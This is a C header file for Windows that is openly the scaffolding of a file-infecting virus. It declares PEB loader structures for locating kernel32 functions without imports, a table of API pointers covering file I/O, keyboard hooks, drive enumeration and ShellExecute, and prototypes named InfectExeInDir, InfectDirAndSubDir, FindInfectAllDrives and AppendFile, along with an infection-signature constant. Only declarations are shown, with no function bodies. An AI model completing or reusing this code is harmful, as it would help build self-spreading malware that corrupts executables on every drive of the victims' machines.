#include <windows.h>
#include <winnt.h>
#include <Winternl.h>

#define LENGTH_OF_SIGNATURE 35
typedef ULONGLONG QWORD;


struct LIST_ENTRY
{
 struct LIST_ENTRY* Flink;
 struct LIST_ENTRY* Blink;
};

typedef struct
{
 ULONG Length;
 BYTE  bInitialized;
 PVOID SsHandle;
 LIST_ENTRY InLoadOrderModuleList;
 LIST_ENTRY InMemoryOrderModuleList;
 LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct 
{LIST_ENTRY  InLoadOrderModuleList;
 LIST_ENTRY  InMemoryOrderModuleList;
 LIST_ENTRY  InInitializationOrderModuleList;
 PVOID  BaseAddress;
 PVOID  EntryPoint;
 ULONG  SizeOfImage;
 UNICODE_STRING  FullDllName;
 UNICODE_STRING  BaseDllName;
 ULONG  Flags;
 SHORT  LoadCount;
 SHORT  TlsIndex;
 LIST_ENTRY  HashTableEntry;
 ULONG  TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;

typedef struct
{
	BYTE  bInheritedAddressSpace;
	BYTE  bReadImageFileExecOptions;
	BYTE  bBeingDebugged;
	BYTE  bSpare;
	HANDLE hMutant;
	PVOID  ImageBaseAddress;
	PPEB_LDR_DATA LoaderData;
} MYPEB, *PMYPEB;

/* LoadLibraryA */
typedef HMODULE(__stdcall * ptLoadLibraryA) (char *);
/* GetProcAddress */
typedef FARPROC(__stdcall * ptGetProcAddress) (HMODULE, char *);
/* GetSystemDirectoy */
typedef UINT(__stdcall * ptGetSystemDirectory) (char *, UINT);
/* lstrcat */
typedef UINT(__stdcall * ptlstrcat) (char *, char *);
/* FreeLibrary */
typedef BOOL(__stdcall * ptFreeLibrary) (HMODULE);
/* MessageBox */
typedef UINT(__stdcall * ptMessageBox) (HWND, char *, char *, UINT);
/* _exit */
typedef void(__stdcall * ptexit) (int);
/* wsprintf */
typedef int(__cdecl * ptwsprintf) (char *, char *, ...);
/* FindFirstFile */
typedef HANDLE(__stdcall * ptFindFirstFile) (char *, LPWIN32_FIND_DATA);
/* lstrcpy */
typedef char *(__stdcall * ptlstrcpy) (char *, char *);
/* FindNextFile */
typedef BOOL(__stdcall * ptFindNextFile) (HANDLE, LPWIN32_FIND_DATA);
/*CreateFile*/
typedef HANDLE(__stdcall * ptCreateFile) (char *, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
/*ReadFile*/
typedef BOOL(__stdcall * ptReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
/*VirtualAlloc*/
typedef LPVOID(__stdcall * ptVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
/*GetFileSizeEx*/
typedef BOOL(__stdcall * ptGetFileSizeEx)(HANDLE, PLARGE_INTEGER);
/*SetEndOfFile*/
typedef BOOL(__stdcall * ptSetEndOfFile)(HANDLE);
/*WriteFile*/
typedef BOOL(__stdcall * ptWriteFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
/*SetFilePointer*/
typedef DWORD(__stdcall * ptSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
/*VirtualFree*/
typedef BOOL(__stdcall * ptVirtualFree)(LPVOID, SIZE_T, DWORD);
/*CloseHandle*/
typedef BOOL(__stdcall * ptCloseHandle)(HANDLE);
/*GetCommandLineA*/
typedef LPTSTR (__stdcall * ptGetCommandLine)(void);
/*lstrlen*/
typedef int (__stdcall * ptlstrlen)(char *);
/*memset*/
typedef void * (__cdecl * ptmemset)(void *, int, size_t);
/*SetWindowsHookEx*/
typedef HHOOK (__stdcall * ptSetWindowsHookEx)(int, HOOKPROC, HINSTANCE, DWORD);
/*UnhookWindowsHookEx*/
typedef BOOL (__stdcall * ptUnhookWindowsHookEx)(HHOOK);
/*GetMessage*/
typedef BOOL (__stdcall * ptGetMessage)(LPMSG, HWND, UINT, UINT);
/*CopyFile*/
typedef BOOL (__stdcall * ptCopyFile)(LPCTSTR, LPCTSTR, BOOL);
/*GetLogicalDriveStrings*/
typedef DWORD (__stdcall * ptGetLogicalDriveStrings)(DWORD, LPTSTR);
/*GetDriveType*/
typedef UINT (__stdcall * ptGetDriveType)(LPCTSTR);
/*ShellExecute*/
typedef HINSTANCE (__stdcall * ptShellExecute)(HWND, LPCTSTR, LPCTSTR, LPCTSTR, LPCTSTR, INT);
/*GetWindowsDirectory*/
typedef UINT (__stdcall * ptGetWindowsDirectoryA)(LPTSTR, UINT);




typedef struct
{ptLoadLibraryA fnLoadLibrary;
ptGetProcAddress fnGetProcAddress;
ptGetSystemDirectory fnGetSystemDirectory;
ptlstrcat fnlstrcat;
ptFreeLibrary fnFreeLibrary;
ptMessageBox fnMessageBox;
ptexit fnexit;
ptwsprintf fnwsprintf;
ptFindFirstFile fnFindFirstFile;
ptlstrcpy fnlstrcpy;
ptFindNextFile fnFindNextFile;
ptCreateFile fnCreateFile;
ptReadFile fnReadFile;
ptVirtualAlloc fnVirtualAlloc;
ptGetFileSizeEx fnGetFileSizeEx;
ptSetEndOfFile fnSetEndOfFile;
ptWriteFile fnWriteFile;
ptSetFilePointer fnSetFilePointer;
ptVirtualFree fnVirtualFree;
ptCloseHandle fnCloseHandle;
ptGetCommandLine fnGetCommandLine;
ptlstrlen fnlstrlen;
ptmemset fnmemset;
ptSetWindowsHookEx fnSetWindowsHookEx;
ptUnhookWindowsHookEx fnUnhookWindowsHookEx;
ptGetMessage fnGetMessage;
ptCopyFile fnCopyFile;
ptGetLogicalDriveStrings fnGetLogicalDriveStrings;
ptGetDriveType fnGetDriveType;
ptShellExecute fnShellExecute;
ptGetWindowsDirectoryA fnGetWindowsDirectoryA;
} API_LOADED;


typedef struct
{char *BSLASH;
char *STRING_EXE;
char *STAR;
char *DOT;
char *DOTDOT;
char *DOTNET;
char *SIGNATURE;
char *FAKE;
}STR_CHARS;

int APIENTRY WinMain(HINSTANCE, HINSTANCE, LPSTR, int);
int CheckIfSameString(char *, char *);

QWORD LookUpKernel(QWORD, char *);

void AppendFile(char *, DWORD, BYTE *, LONG, DWORD, STR_CHARS, API_LOADED);
void InfectDirAndSubDir(char *, BYTE *, LONG, DWORD, STR_CHARS, API_LOADED);
void InfectExeInDir(char *, BYTE *, LONG, DWORD, STR_CHARS, API_LOADED);
void FindInfectAllDrives(char *, STR_CHARS, API_LOADED);
QWORD Virtual2Offset(PIMAGE_NT_HEADERS, QWORD);